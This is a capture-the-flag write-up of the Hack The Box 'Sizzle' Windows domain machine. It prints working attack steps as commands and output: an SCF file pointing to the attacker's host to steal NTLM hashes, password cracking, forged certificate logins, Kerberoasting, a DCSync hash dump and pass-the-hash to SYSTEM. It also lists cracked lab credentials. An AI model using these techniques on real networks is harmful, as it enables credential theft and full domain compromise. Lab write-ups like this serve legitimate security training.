---
title: "Hack The Box - Sizzle"
tags: [windows,insane,applocker,AD,kerberoast,rubeus,dcsync,scf]
categories: HackTheBox
---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled.png)

This box is really fun and some Active Directory stuffs which is really good. Getting User is doing SCF attack and create certificate for the user and to get 2nd user we need to do Kerberoast and the second user have some special privilege to do DCSync attack.

Link: [https://www.hackthebox.eu/home/machines/profile/169](https://www.hackthebox.eu/home/machines/profile/169)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2020-07-30T12:36:44+00:00; +1m51s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2020-07-30T12:36:44+00:00; +1m51s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2020-07-30T12:36:45+00:00; +1m52s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2020-07-30T12:36:44+00:00; +1m51s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2020-07-30T12:36:44+00:00; +1m51s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after:  2019-07-02T20:26:23
|_ssl-date: 2020-07-30T12:36:44+00:00; +1m51s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
50686/tcp open  msrpc         Microsoft Windows RPC
50698/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m50s, deviation: 0s, median: 1m50s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-30T12:36:01
|_  start_date: 2020-07-30T10:00:40
```

## SMB Enumeration

Started checking all the shares and `Department Shares` have some files and I can logged in without any username and password.

```bash
root@kali:~/CTF/HTB/Boxes/Sizzle# smbclient //10.10.10.103/"Department Shares"
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul  3 20:52:32 2018
  ..                                  D        0  Tue Jul  3 20:52:32 2018
  Accounting                          D        0  Tue Jul  3 00:51:43 2018
  Audit                               D        0  Tue Jul  3 00:44:28 2018
  Banking                             D        0  Tue Jul  3 20:52:39 2018
  CEO_protected                       D        0  Tue Jul  3 00:45:01 2018
  Devops                              D        0  Tue Jul  3 00:49:33 2018
  Finance                             D        0  Tue Jul  3 00:41:57 2018
  HR                                  D        0  Tue Jul  3 00:46:11 2018
  Infosec                             D        0  Tue Jul  3 00:44:24 2018
  Infrastructure                      D        0  Tue Jul  3 00:43:59 2018
  IT                                  D        0  Tue Jul  3 00:42:04 2018
  Legal                               D        0  Tue Jul  3 00:42:09 2018
  M&A                                 D        0  Tue Jul  3 00:45:25 2018
  Marketing                           D        0  Tue Jul  3 00:44:43 2018
  R&D                                 D        0  Tue Jul  3 00:41:47 2018
  Sales                               D        0  Tue Jul  3 00:44:37 2018
  Security                            D        0  Tue Jul  3 00:51:47 2018
  Tax                                 D        0  Tue Jul  3 00:46:54 2018
  Users                               D        0  Wed Jul 11 03:09:32 2018
  ZZ_ARCHIVE                          D        0  Tue Jul  3 01:02:58 2018

		7779839 blocks of size 4096. 2565579 blocks available
```

ZZ_ARCHIVE have some files, better check this later.

```bash
smb: \> cd ZZ_ARCHIVE
smb: \ZZ_ARCHIVE\> ls
  .                                   D        0  Tue Jul  3 01:02:58 2018
  ..                                  D        0  Tue Jul  3 01:02:58 2018
  AddComplete.pptx                    A   419430  Tue Jul  3 01:02:58 2018
  AddMerge.ram                        A   419430  Tue Jul  3 01:02:57 2018
  ConfirmUnprotect.doc                A   419430  Tue Jul  3 01:02:57 2018
  ConvertFromInvoke.mov               A   419430  Tue Jul  3 01:02:57 2018
  ConvertJoin.docx                    A   419430  Tue Jul  3 01:02:57 2018
  CopyPublish.ogg                     A   419430  Tue Jul  3 01:02:57 2018
  DebugMove.mpg                       A   419430  Tue Jul  3 01:02:57 2018
  DebugSelect.mpg                     A   419430  Tue Jul  3 01:02:58 2018
  DebugUse.pptx                       A   419430  Tue Jul  3 01:02:57 2018
  DisconnectApprove.ogg               A   419430  Tue Jul  3 01:02:58 2018
  DisconnectDebug.mpeg2               A   419430  Tue Jul  3 01:02:57 2018
  EditCompress.xls                    A   419430  Tue Jul  3 01:02:57 2018
  EditMount.doc                       A   419430  Tue Jul  3 01:02:58 2018
  EditSuspend.mp3                     A   419430  Tue Jul  3 01:02:58 2018
  EnableAdd.pptx                      A   419430  Tue Jul  3 01:02:57 2018
  EnablePing.mov                      A   419430  Tue Jul  3 01:02:58 2018
  EnableSend.ppt                      A   419430  Tue Jul  3 01:02:58 2018
  EnterMerge.mpeg                     A   419430  Tue Jul  3 01:02:57 2018
  ExitEnter.mpg                       A   419430  Tue Jul  3 01:02:58 2018
  ExportEdit.ogg                      A   419430  Tue Jul  3 01:02:57 2018
  GetOptimize.pdf                     A   419430  Tue Jul  3 01:02:58 2018
  GroupSend.rm                        A   419430  Tue Jul  3 01:02:58 2018
  HideExpand.rm                       A   419430  Tue Jul  3 01:02:58 2018
  InstallWait.pptx                    A   419430  Tue Jul  3 01:02:57 2018
  JoinEnable.ram                      A   419430  Tue Jul  3 01:02:58 2018
  LimitInstall.doc                    A   419430  Tue Jul  3 01:02:57 2018
  LimitStep.ppt                       A   419430  Tue Jul  3 01:02:57 2018
  MergeBlock.mp3                      A   419430  Tue Jul  3 01:02:58 2018
  MountClear.mpeg2                    A   419430  Tue Jul  3 01:02:57 2018
  MoveUninstall.docx                  A   419430  Tue Jul  3 01:02:57 2018
  NewInitialize.doc                   A   419430  Tue Jul  3 01:02:57 2018
  OutConnect.mpeg2                    A   419430  Tue Jul  3 01:02:58 2018
  PingGet.dot                         A   419430  Tue Jul  3 01:02:58 2018
  ReceiveInvoke.mpeg2                 A   419430  Tue Jul  3 01:02:56 2018
  RemoveEnter.mpeg3                   A   419430  Tue Jul  3 01:02:57 2018
  RemoveRestart.mpeg                  A   419430  Tue Jul  3 01:02:57 2018
  RequestJoin.mpeg2                   A   419430  Tue Jul  3 01:02:58 2018
  RequestOpen.ogg                     A   419430  Tue Jul  3 01:02:58 2018
  ResetCompare.avi                    A   419430  Tue Jul  3 01:02:58 2018
  ResetUninstall.mpeg                 A   419430  Tue Jul  3 01:02:58 2018
  ResumeCompare.doc                   A   419430  Tue Jul  3 01:02:58 2018
  SelectPop.ogg                       A   419430  Tue Jul  3 01:02:57 2018
  SuspendWatch.mp4                    A   419430  Tue Jul  3 01:02:58 2018
  SwitchConvertFrom.mpg               A   419430  Tue Jul  3 01:02:57 2018
  UndoPing.rm                         A   419430  Tue Jul  3 01:02:58 2018
  UninstallExpand.mp3                 A   419430  Tue Jul  3 01:02:57 2018
  UnpublishSplit.ppt                  A   419430  Tue Jul  3 01:02:58 2018
  UnregisterPing.pptx                 A   419430  Tue Jul  3 01:02:57 2018
  UpdateRead.mpeg                     A   419430  Tue Jul  3 01:02:57 2018
  WaitRevoke.pptx                     A   419430  Tue Jul  3 01:02:57 2018
  WriteUninstall.mp3                  A   419430  Tue Jul  3 01:02:58 2018

		7779839 blocks of size 4096. 2560396 blocks available
```

Checking the Users directory and I got some usernames from here.

```bash
smb: \> cd Users
smb: \Users\> ls
  .                                   D        0  Wed Jul 11 03:09:32 2018
  ..                                  D        0  Wed Jul 11 03:09:32 2018
  amanda                              D        0  Tue Jul  3 00:48:43 2018
  amanda_adm                          D        0  Tue Jul  3 00:49:06 2018
  bill                                D        0  Tue Jul  3 00:48:28 2018
  bob                                 D        0  Tue Jul  3 00:48:31 2018
  chris                               D        0  Tue Jul  3 00:49:14 2018
  henry                               D        0  Tue Jul  3 00:48:39 2018
  joe                                 D        0  Tue Jul  3 00:48:34 2018
  jose                                D        0  Tue Jul  3 00:48:53 2018
  lkys37en                            D        0  Wed Jul 11 03:09:04 2018
  morgan                              D        0  Tue Jul  3 00:48:48 2018
  mrb3n                               D        0  Tue Jul  3 00:49:20 2018
  Public                              D        0  Wed Sep 26 11:15:32 2018

		7779839 blocks of size 4096. 2558294 blocks available
```

After some enumeration, I found that we have write permission on `\Users\Public` and I PayloadsAllTheThings I found we can do SCF attack.

SCF (Shell Command Files) files can be used to access a specific UNC path (//) which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.

```json
[Shell]
Command=2
IconFile=\\10.10.14.4\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

> [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md#scf-and-url-file-attack-against-writeable-share](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)

I created the .scf file and put that in Public directory.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%201.png)

I got Amanda's hash, Time to crack it using JTR

Cracked the hash and the password is `Ashare1972`

```bash
root@kali:~/CTF/HTB/Boxes/Sizzle# john --wordlist=/usr/share/wordlists/rockyou.txt amanda 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)
1g 0:00:00:05 DONE (2020-07-30 19:29) 0.1763g/s 2013Kp/s 2013Kc/s 2013KC/s Ashiah08..Ariel!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

I tried to login with `evil-winrm` and doesn't work. So Let's continue enumerate.

## HTTP Enumeration

We know port 80 is open, and it displays an image.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%202.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%202.png)

### GoBuster Scan Results

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.103/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/30 19:31:40 Starting gobuster
===============================================================
/aspnet_client (Status: 301)
/certenroll (Status: 301)
/certsrv (Status: 401)
/images (Status: 301)
/Images (Status: 301)
/index.html (Status: 200)
===============================================================
2020/07/30 19:33:53 Finished
===============================================================
```

Checking `/certsrv` it asks for authentication and we got a valid username and password already. `amanda : Ashare1972`       

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%203.png)

Its a Windows AD Certificate Services.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%204.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%204.png)

> **What is Active Directory Certificate Services (AD CS)? According to Microsoft, AD CS is the “Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization.”**

Checking through the links. By clicking on the “Request a certificate” link on the page, and it will give me another page to request a type.

By Checking "Advanced Certificate Request" we can add sign our own key.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%205.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%205.png)

We have an option in evil-winrm to use public keys and private keys to login.

```bash
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
```

I created a the key for user `amanda` and Certificate Signing Request (CSR) is created with the following commands.

```bash
root@kali:~/CTF/HTB/Boxes/Sizzle# openssl genrsa -aes256 -out amanda.key
Generating RSA private key, 2048 bit long modulus (2 primes)
...................................+++++
...............................................................................................................................................................................................................+++++
e is 65537 (0x010001)
Enter pass phrase for amanda.key:
Verifying - Enter pass phrase for amanda.key:
root@kali:~/CTF/HTB/Boxes/Sizzle# openssl req -new -key amanda.key -out amanda.csr
Enter pass phrase for amanda.key:
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
root@kali:~/CTF/HTB/Boxes/Sizzle# cat amanda.csr 
-----BEGIN CERTIFICATE REQUEST-----
MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBAMI0739EIyViJpveV/xrxpKgtkLWXg7mY0ko3dVJ
qaBDmxuwi23it7uIeVme1eQVjo+krJcsyhOOnjiqZbBZU+meFLmqXaOp1aXPVtT0
p5vdeTx2clD9SeE5xWh96mYqIbUuXB3+r4PYWGqEdL5miaGDj4+rsoqnNrLFY6f7
Z+XWQvcPQoqpKvdYz7HztIOl3FNI6E7DDcwvGxz03abgmcxQVuddxVPWHSWI3qtq
7NemE7ljnDEwwsANx5TK2E98p1Hdmyb2DXRxL+hb2BjRctQnJGXOcV4v3WLlFVB9
GBSVt8MKkvWCt0XyCZGlHqt3LmJwFsCZA+qO1rCSn8rk2rcCAwEAAaAAMA0GCSqG
SIb3DQEBCwUAA4IBAQCFcCNqW+HqX+Bih+m8Q3jsxr19BFLpIPeO9Xczl3ucV9MN
itCu3RgQ6bRF+ifXTSbtZF5equd4itlIkVCMTtyeEZB+ZRhFsntNsjEvp5ZBA+zx
tYZ7e5K4Lssbu5T7y9TUeTgwZLIfXWdI/RkscZfoYR0EXU6WvtQr+4UC+YtdQJyL
EoyPhydREdyMPFOaemNvpI/FaCU7UlikI9iFbsFC1b6yaN9HtLocfTo1+awz3eLw
BOignrP1Z3nugqS2OuAgIUCtXufalG3EXAV0/fG8Y9LJJgsOz8OQ4/ZLpph8Tcyk
Jsu8to+xGljIFgmj1qToHgvkXeSbLl/fSW2NOL2i
-----END CERTIFICATE REQUEST-----
```

Then on the certificate web enrollment page, we can copy/paste the content of the CSR.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%206.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%206.png)

This generates a signed certificate that we will download.

## Getting User Shell

Using the Public and Private key I logged in as Amanda. 

```bash
root@kali:~/CTF/HTB/Boxes/Sizzle# evil-winrm -S -i 10.10.10.103 -u amanda -p Ashare1972 -c certnew.cer -k amanda.key 

Evil-WinRM shell v2.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\amanda\Documents> whoami
htb\amanda
```

```bash
-S, --ssl                        Enable ssl
-c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
-k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
```

## Getting 2nd User

The First thing I decided to check is BloodHound, For that we need to Upload SharpHound and run that. It will give us all the data in zip format. (Note : There is some sort of AppLocker that makes us unable to run it but we can use this location to bypass it. For more info, this [repo](https://github.com/api0cradle/UltimateAppLockerByPassList) will help.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Screenshot_2020-07-30_21-41-37.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Screenshot_2020-07-30_21-41-37.png)

First thing I do always is, We already got Amanda so "Add User as Owned" and While checking the queries, List all Kerberoastable Accounts contain `Mrlky`

**Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.**

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/test.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/test.png)

To do Kerberoasting there are various tool, but we can try this Rubeus

> [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

So when running that make sure you use kerberoast option and also mention the user and her password.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%207.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%207.png)

The hashes of `mrlky` is stored in hashes.txt file as I mentioned it when running.

I used hashcat to crack the hash and got the password as `Football#7`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%208.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%208.png)

Before login, we can't use this password so you need to create the public and private keys as we did before. Make sure you login with `mrlky : Football#7` in `/certsrv` and create those keys again.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%203.png)

So I created them and logged in as mrlky.

```bash
root@kali:~/CTF/HTB/Boxes/Sizzle# evil-winrm -S -i 10.10.10.103 -u mrlky -c certnew.cer -k mrlky.key

Evil-WinRM shell v2.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\mrlky.HTB\Documents> whoami
htb\mrlky
```

## Privilege Escalation

I just run SharpHound again and to copy that to our machine, I just used the SMB Share `Department Shares\Users\Public` and download via smbclient in my machine.

```bash
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> copy 20200731001658_BloodHound.zip 'C:\Department Shares\Users\Public'
Enter PEM pass phrase:

root@kali:~/CTF/HTB/Boxes/Sizzle# smbclient '//10.10.10.103/Department Shares'
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> cd users/public
smb: \users\public\> ls
  .                                   D        0  Fri Jul 31 09:49:25 2020
  ..                                  D        0  Fri Jul 31 09:49:25 2020
  20200731001658_BloodHound.zip       A     9142  Fri Jul 31 09:46:59 2020

		7779839 blocks of size 4096. 2621288 blocks available
smb: \users\public\> get 20200731001658_BloodHound.zip
getting file \users\public\20200731001658_BloodHound.zip of size 9142 as 20200731001658_BloodHound.zip (7.9 KiloBytes/sec) (average 7.9 KiloBytes/sec)
smb: \users\public\>
```

By Checking the Queries, I can see mrlky is in DCSync Rights. So We can do DCSync attacks.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/test%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/test%201.png)

MRLKY has both GetChanges and GetChangesAll, which is what we want to do a DCSync Attack. We can also check that by right click the path and `?Info` will reveal how to abuse it.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%209.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-sizzle/Untitled%209.png)

There are many ways to do DCSync Attack but secretsdump.py is the easiest way to do it. Here we need to give user mrlky and his password. It will dump all the hash.

```bash
root@kali:~/CTF/HTB/Boxes/Sizzle# secretsdump.py mrlky@10.10.10.103
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:acab2862d095070be6c564b548e5bff2:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:dbea0033f1f2c77592c41043ce7e565eee411c06ff6b264d320c7e3b2dd2c9fc
SIZZLE$:aes128-cts-hmac-sha1-96:0828b305826a82e0bb1b1141a2d757f6
SIZZLE$:des-cbc-md5:7f5dcd5e0b80adfe
[*] Cleaning up...
```

We can use the hash to login.

```bash
root@kali:~/CTF/HTB/Boxes/Sizzle# psexec.py Administrator@10.10.10.103 -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.103.....
[*] Found writable share ADMIN$
[*] Uploading file zfiadosf.exe
[*] Opening SVCManager on 10.10.10.103.....
[*] Creating service JmWA on 10.10.10.103.....
[*] Starting service JmWA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

We Own the Box!!